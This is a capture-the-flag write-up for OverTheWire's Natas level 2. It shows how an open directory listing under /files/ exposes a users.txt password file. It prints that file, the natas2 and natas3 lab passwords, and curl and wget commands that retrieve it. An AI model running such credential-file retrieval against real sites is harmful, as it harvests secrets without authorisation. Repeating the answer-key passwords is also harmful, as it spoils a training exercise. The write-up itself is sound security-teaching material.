# Level 1 - Level 2: Natas - OverTheWire

## Level Goal

Username: natas2
URL:      http://natas2.natas.labs.overthewire.org

## Solution
For this level, we can first `curl` the page with our `natas.sh` script and entering the level credentials as arguments.

From the output, it appears to be an "empty" page, but there is an interesting image file linked:

```html
<div id="content">
There is nothing on this page
<img src="files/pixel.png">
</div>
```
Upon viewing this image (`files/pixel.png` in the browser, it is legitimately just an empty pixel, however, the path to this image makes me wonder what else could be listed under `/files/`.

Upon navigating to `/files/` we can see that it is an `Index` page. This is due to the configuration of the webserver allowing indexing, as well as the fact that there is no `index.html`, `index.htm`, `index.shtml`, `index.php`, etc. page present.

Because of this misconfiguration, we can see that along with the image, there is a `users.txt` file we can access as well. Upon viewing that page, we get the following output:

```txt
# username:password
alice:BYNdCesZqW
bob:jw2ueICLvT
charlie:G5vCxkVV3m
natas3:G6ctbMJ5Nb4cbFwhpMPSvxGHhQ7I6W8Q
eve:zo4mJWyNj2
mallory:9urtcpzBmH
```

And with that, we have the `natas3` password.

We could of course, view this file in the browser (or even grab the file itself using `wget`):

```bash
└─$ curl http://natas2.natas.labs.overthewire.org/files/users.txt -u natas2:h4ubbcXrWqsTo7GGnnUMLppXbOogfBZ7 | grep natas3 
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100   145  100   145    0     0    452      0 --:--:-- --:--:-- --:--:--   453
natas3:G6ctbMJ5Nb4cbFwhpMPSvxGHhQ7I6W8Q
```

```bash
wget http://natas2.natas.labs.overthewire.org/files/users.txt --user natas2 --password h4ubbcXrWqsTo7GGnnUMLppXbOogfBZ7

2023-02-12 15:54:59 (27.7 MB/s) - ‘users.txt’ saved [145/145]

cat users.txt  
# username:password
alice:BYNdCesZqW
bob:jw2ueICLvT
charlie:G5vCxkVV3m
natas3:G6ctbMJ5Nb4cbFwhpMPSvxGHhQ7I6W8Q
eve:zo4mJWyNj2
mallory:9urtcpzBmH
```
